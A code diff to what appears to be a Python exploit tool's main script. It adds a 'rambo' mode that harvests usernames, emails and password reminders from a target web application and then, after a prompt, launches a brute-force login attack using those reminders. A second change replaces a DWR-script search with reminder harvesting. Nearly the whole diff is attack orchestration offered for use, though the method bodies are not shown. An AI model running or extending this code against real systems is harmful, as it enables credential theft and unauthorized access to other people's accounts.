@@ -21,6 +21,7 @@ if __name__ == '__main__':
     parser.add_argument('--users-file', action='store', dest='users_file', help='Users file retrieve from previous exploit')
     parser.add_argument('--password-file', action='store', dest='password_file', help='Password file')
     parser.add_argument("--getremainder", action="store", dest="remainder", help="get password remainder for a input user", default=False)
+    parser.add_argument("--rambo", action="store_const", const="rambo", help="retrieve all users, passwords remainders, and.. make a brute with remainders passwords", default=False)
     results = parser.parse_args()
 
     if results.url and results.brute:
@@ -93,7 +94,8 @@ if __name__ == '__main__':
         mmObj.GetAdminLogin()
         mmObj.xpltUserEmail()
         mmObj.XptGetUsersLogin()
-        mmObj.SearchDWRScripts()
+        # mmObj.SearchDWRScripts()
+        mmObj.allRemaindersByName()
 
     if results.remainder and results.url != None:
         urllib3.disable_warnings()
@@ -105,5 +107,27 @@ if __name__ == '__main__':
         mmObj.XptGetUsersLogin()
         mmObj.XptGetURemainder()
 
+    if results.url and results.rambo:
+        urllib3.disable_warnings()
+        mmObj = Cofe(results.url, results.max_threads, results.random_agent)
+        mmObj.RandomAgent()
+        mmObj.CleanUrl()
+        mmObj.ToString()
+        mmObj.IsUpOrDown()
+        mmObj.IsRobots()
+        mmObj.GetAdminLogin()
+        mmObj.allRemaindersByName()
+        mmObj.XptGetUsersLogin()
+        answer = input(ask("[+] Start brute force ? Y/n: ")).lower()
+        if answer[0] == "y":
+            urllib3.disable_warnings()
+            bruteObj = Brute(results.url, results.random_agent)
+            bruteObj.CleanUrl()
+            bruteObj.RandomAgent()
+            bruteObj.DoBruteForceRemainderPass(results.users_file)
+            exit()
+        else:
+            answer[0] == "n"
+            print(display("[-] Thanks to use this tool.. issues are welcome.."))
         
     
